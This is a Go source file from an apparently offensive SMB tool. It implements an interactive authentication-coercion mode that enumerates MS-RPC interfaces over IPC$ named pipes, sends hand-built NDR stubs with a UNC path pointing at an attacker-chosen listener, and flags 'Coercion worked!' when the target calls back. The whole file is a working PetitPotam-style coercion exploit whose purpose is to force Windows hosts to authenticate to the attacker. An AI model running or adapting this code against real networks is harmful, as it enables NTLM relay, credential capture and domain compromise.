package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/coerce"
	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
)

// Coercion VFS state
var (
	coerceMode         bool
	coerceListener     string
	currentCoerceIface *coerce.InterfaceInfo
	coerceIpcTree      *smb.Tree
	coerceTokens       = make(map[string]string) // token -> "interface:opnum:method"
)

// enterCoerceMode enters the Coercion VFS mode
func enterCoerceMode(ctx context.Context) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	info_("Connecting to IPC$...")

	// Connect to IPC$
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %w", err)
	}

	coerceIpcTree = ipcTree
	coerceMode = true
	coerceListener = ""
	currentCoerceIface = nil

	success_("Connected to Coercion VFS")
	info_("Use 'ls' to list interfaces, 'radar' for overview, 'help' for commands")

	return nil
}

// cmdCoerceLs lists interfaces or methods
func cmdCoerceLs(ctx context.Context, args []string) error {
	if currentCoerceIface == nil {
		// At root - list all interfaces
		return listCoerceInterfaces(ctx)
	}

	// Inside interface - list methods
	return listCoerceMethods(ctx, currentCoerceIface)
}

// listCoerceInterfaces shows all available interfaces
func listCoerceInterfaces(ctx context.Context) error {
	interfaces := coerce.Database()

	fmt.Println()
	fmt.Printf("  %s%-12s %-15s %-10s %s    %s%s\n",
		colorBold, "INTERFACE", "PIPE", "STATUS", "CONFIRMED", "CANDIDATES", colorReset)
	fmt.Println("  " + strings.Repeat("-", 70))

	for _, iface := range interfaces {
		// Check accessibility
		status := checkInterfaceAccess(ctx, &iface)
		statusStr := formatAccessStatus(status)

		confirmed := 0
		candidates := 0
		for _, m := range iface.Methods {
			switch m.Status {
			case coerce.StatusConfirmed:
				confirmed++
			case coerce.StatusCandidate:
				candidates++
			}
		}

		fmt.Printf("  %-12s %-15s %-10s %d          %d\n",
			iface.Name+"/", iface.Pipe, statusStr, confirmed, candidates)
	}

	fmt.Println()
	if coerceListener != "" {
		fmt.Printf("  Listener: %s\n", coerceListener)
	} else {
		fmt.Printf("  %sTip:%s Set listener with 'listener <IP>'\n", colorCyan, colorReset)
	}
	fmt.Println()

	return nil
}

// listCoerceMethods shows methods in an interface
func listCoerceMethods(ctx context.Context, iface *coerce.InterfaceInfo) error {
	fmt.Println()
	fmt.Printf("  %s%s%s - %s\n", colorBold, iface.Name, colorReset, iface.Description)
	fmt.Printf("  UUID: %s\n", iface.UUID.String())
	fmt.Printf("  Pipe: %s\n\n", iface.Pipe)

	fmt.Printf("  %s%-6s %-35s %-15s %s%s\n",
		colorBold, "OPNUM", "METHOD", "PATH_PARAM", "STATUS", colorReset)
	fmt.Println("  " + strings.Repeat("-", 75))

	for _, m := range iface.Methods {
		pathParam := "-"
		if len(m.PathParams) > 0 {
			pathParam = m.PathParams[0].Name
		}

		statusStr := formatMethodStatus(m.Status)
		fmt.Printf("  %-6d %-35s %-15s %s\n",
			m.Opnum, truncate(m.Name, 35), truncate(pathParam, 15), statusStr)
	}

	fmt.Println()
	return nil
}

// cmdCoerceCd navigates interfaces
func cmdCoerceCd(ctx context.Context, args []string) error {
	if len(args) == 0 {
		// Go to root
		currentCoerceIface = nil
		return nil
	}

	target := args[0]

	if target == ".." || target == "/" {
		currentCoerceIface = nil
		return nil
	}

	// Strip trailing slash
	target = strings.TrimSuffix(target, "/")

	// Find interface by name
	iface := coerce.GetInterface(target)
	if iface == nil {
		// Try with MS- prefix
		iface = coerce.GetInterface("MS-" + target)
	}
	if iface == nil {
		return fmt.Errorf("interface not found: %s", target)
	}

	currentCoerceIface = iface
	return nil
}

// cmdCoercePwd shows current path
func cmdCoercePwd(ctx context.Context, args []string) error {
	if currentCoerceIface == nil {
		fmt.Println("  /")
	} else {
		fmt.Printf("  /%s\n", currentCoerceIface.Name)
	}
	return nil
}

// cmdCoerceRadar shows the radar summary
func cmdCoerceRadar(ctx context.Context, args []string) error {
	interfaces := coerce.Database()

	confirmed := 0
	candidates := 0
	negative := 0
	ifaceCount := 0

	for _, iface := range interfaces {
		ifaceCount++
		for _, m := range iface.Methods {
			switch m.Status {
			case coerce.StatusConfirmed:
				confirmed++
			case coerce.StatusCandidate:
				candidates++
			case coerce.StatusNegative:
				negative++
			}
		}
	}

	fmt.Println()
	fmt.Println("  ╔══════════════════════════════════════════════════════════════════╗")
	fmt.Println("  ║  COERCION RADAR - Methods with Path Parameters                   ║")
	fmt.Println("  ╠══════════════════════════════════════════════════════════════════╣")
	fmt.Println("  ║                                                                  ║")
	fmt.Printf("  ║  ● CONFIRMED  (%2d interfaces, %2d methods)                        ║\n", ifaceCount, confirmed)
	fmt.Printf("  ║  ○ CANDIDATES (%2d interfaces, %2d methods)  ← Untested!           ║\n", ifaceCount, candidates)
	fmt.Printf("  ║  ✗ NEGATIVE   (%2d interfaces, %2d methods)                        ║\n", ifaceCount, negative)
	fmt.Println("  ║                                                                  ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════════════╝")
	fmt.Println()

	return nil
}

// cmdCoerceListener sets the default listener
func cmdCoerceListener(ctx context.Context, args []string) error {
	if len(args) == 0 {
		if coerceListener == "" {
			fmt.Println("  No listener set. Usage: listener <IP>")
		} else {
			fmt.Printf("  Listener: %s\n", coerceListener)
		}
		return nil
	}

	coerceListener = args[0]
	success_("Listener set to %s", coerceListener)
	return nil
}

// cmdCoerceCat shows method details
func cmdCoerceCat(ctx context.Context, args []string) error {
	if currentCoerceIface == nil {
		return fmt.Errorf("navigate to an interface first (cd <interface>)")
	}

	if len(args) == 0 {
		return fmt.Errorf("usage: cat <opnum>")
	}

	var opnum uint16
	if _, err := fmt.Sscanf(args[0], "%d", &opnum); err != nil {
		return fmt.Errorf("invalid opnum: %s", args[0])
	}

	// Find method
	var method *coerce.MethodInfo
	for i := range currentCoerceIface.Methods {
		if currentCoerceIface.Methods[i].Opnum == opnum {
			method = &currentCoerceIface.Methods[i]
			break
		}
	}

	if method == nil {
		return fmt.Errorf("method opnum %d not found in %s", opnum, currentCoerceIface.Name)
	}

	fmt.Println()
	fmt.Printf("  %sMethod:%s %s\n", colorBold, colorReset, method.Name)
	fmt.Printf("  %sOpnum:%s  %d\n", colorBold, colorReset, method.Opnum)
	fmt.Printf("  %sStatus:%s %s\n", colorBold, colorReset, formatMethodStatus(method.Status))
	fmt.Println()

	if len(method.PathParams) > 0 {
		fmt.Printf("  %sPath Parameters:%s\n", colorCyan, colorReset)
		for _, p := range method.PathParams {
			fmt.Printf("    Position %d: %s (%s)\n", p.Position, p.Name, p.Type)
		}
		fmt.Println()
	}

	if method.Notes != "" {
		fmt.Printf("  %sNotes:%s %s\n", colorCyan, colorReset, method.Notes)
		fmt.Println()
	}

	fmt.Printf("  %sUsage:%s try %d\n", colorCyan, colorReset, method.Opnum)
	fmt.Println()

	return nil
}

// cmdCoerceTry tests a specific method
func cmdCoerceTry(ctx context.Context, args []string) error {
	if currentCoerceIface == nil {
		return fmt.Errorf("navigate to an interface first (cd <interface>)")
	}

	if len(args) == 0 {
		return fmt.Errorf("usage: try <opnum> [listener]")
	}

	var opnum uint16
	if _, err := fmt.Sscanf(args[0], "%d", &opnum); err != nil {
		return fmt.Errorf("invalid opnum: %s", args[0])
	}

	listener := coerceListener
	if len(args) > 1 {
		listener = args[1]
	}

	if listener == "" {
		return fmt.Errorf("no listener set. Use: listener <IP> or try <opnum> <listener>")
	}

	// Find method
	var method *coerce.MethodInfo
	for i := range currentCoerceIface.Methods {
		if currentCoerceIface.Methods[i].Opnum == opnum {
			method = &currentCoerceIface.Methods[i]
			break
		}
	}

	if method == nil {
		return fmt.Errorf("method opnum %d not found in %s", opnum, currentCoerceIface.Name)
	}

	info_("Testing %s:%d (%s) with listener %s...",
		currentCoerceIface.Name, opnum, method.Name, listener)

	// Open the pipe
	p, err := pipe.Open(ctx, coerceIpcTree, currentCoerceIface.Pipe)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %w", currentCoerceIface.Pipe, err)
	}
	defer p.Close()

	// Create RPC client and bind
	rpc := dcerpc.NewClient(p)
	if err := rpc.Bind(currentCoerceIface.UUID, currentCoerceIface.Version); err != nil {
		return fmt.Errorf("bind failed: %w", err)
	}

	// Generate random token for callback correlation
	token := generateToken()
	coerceTokens[token] = fmt.Sprintf("%s:%d:%s", currentCoerceIface.Name, opnum, method.Name)

	// Build UNC path with token for correlation
	uncPath := fmt.Sprintf("\\\\%s\\%s\\%s", listener, token, method.Name)
	info_("UNC path: %s", uncPath)
	info_("Token: %s (look for this in callbacks)", token)

	// Build stub and call
	stub := buildCoercionStub(method, uncPath)
	_, err = rpc.Call(opnum, stub)

	if err != nil {
		errStr := err.Error()
		if strings.Contains(errStr, "BAD_NETPATH") || strings.Contains(errStr, "0x6f7") {
			success_("ERROR_BAD_NETPATH detected - Coercion worked!")
			success_("Check your listener for callback from %s", targetHost)
			success_("Look for share: %s", token)
			return nil
		}
		warn_("RPC returned: %s", errStr)
	} else {
		info_("Method returned success (no callback indicator)")
	}

	return nil
}

// cmdCoerceDisconnect exits coercion mode
func cmdCoerceDisconnect(ctx context.Context, args []string) error {
	if coerceIpcTree != nil {
		client.TreeDisconnect(ctx, coerceIpcTree)
		coerceIpcTree = nil
	}
	coerceMode = false
	coerceListener = ""
	currentCoerceIface = nil
	info_("Disconnected from Coercion VFS")
	return nil
}

// Helper functions

func checkInterfaceAccess(ctx context.Context, iface *coerce.InterfaceInfo) string {
	// Try to open the pipe
	p, err := pipe.Open(ctx, coerceIpcTree, iface.Pipe)
	if err != nil {
		if strings.Contains(err.Error(), "STATUS_ACCESS_DENIED") {
			return "denied"
		}
		if strings.Contains(err.Error(), "STATUS_OBJECT_NAME_NOT_FOUND") {
			return "not_found"
		}
		return "error"
	}
	defer p.Close()

	// Try to bind
	rpc := dcerpc.NewClient(p)
	if err := rpc.Bind(iface.UUID, iface.Version); err != nil {
		return "bind_fail"
	}

	return "ok"
}

func formatAccessStatus(status string) string {
	switch status {
	case "ok":
		return colorGreen + "✓ Ready" + colorReset
	case "denied":
		return colorYellow + "⊘ Denied" + colorReset
	case "not_found":
		return colorRed + "✗ N/A" + colorReset
	case "bind_fail":
		return colorYellow + "⚠ Bind" + colorReset
	default:
		return colorRed + "? Error" + colorReset
	}
}

func formatMethodStatus(status coerce.CoercionStatus) string {
	switch status {
	case coerce.StatusConfirmed:
		return colorGreen + "● CONFIRMED" + colorReset
	case coerce.StatusCandidate:
		return colorYellow + "○ CANDIDATE" + colorReset
	case coerce.StatusNegative:
		return colorRed + "✗ NEGATIVE" + colorReset
	default:
		return "? UNKNOWN"
	}
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// buildCoercionStub creates a minimal NDR stub for coercion testing
func buildCoercionStub(method *coerce.MethodInfo, uncPath string) []byte {
	// Most coercion methods accept a RPC_UNICODE_STRING as first parameter
	// This is a simplified stub that works for common cases
	return encodeCoercionPath(uncPath)
}

// encodeCoercionPath encodes a UNC path for coercion
func encodeCoercionPath(path string) []byte {
	// Encode as RPC_UNICODE_STRING (like PetitPotam does)
	pathRunes := []rune(path + "\x00")

	stub := make([]byte, 0, 256)

	// RPC_UNICODE_STRING structure
	byteLen := uint16(len(pathRunes) * 2)

	// Length, MaximumLength
	stub = append(stub, byte(byteLen), byte(byteLen>>8))
	stub = append(stub, byte(byteLen), byte(byteLen>>8))

	// Buffer pointer (non-null)
	stub = append(stub, 0x00, 0x00, 0x02, 0x00)

	// Conformant array: MaxCount, Offset, ActualCount
	charCount := uint32(len(pathRunes))
	stub = appendUint32Coerce(stub, charCount)
	stub = appendUint32Coerce(stub, 0)
	stub = appendUint32Coerce(stub, charCount)

	// String data in UTF-16LE
	for _, r := range pathRunes {
		stub = append(stub, byte(r), byte(r>>8))
	}

	// Align to 4 bytes
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	return stub
}

func appendUint32Coerce(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// generateToken creates a random 8-character hex token for callback correlation
func generateToken() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}
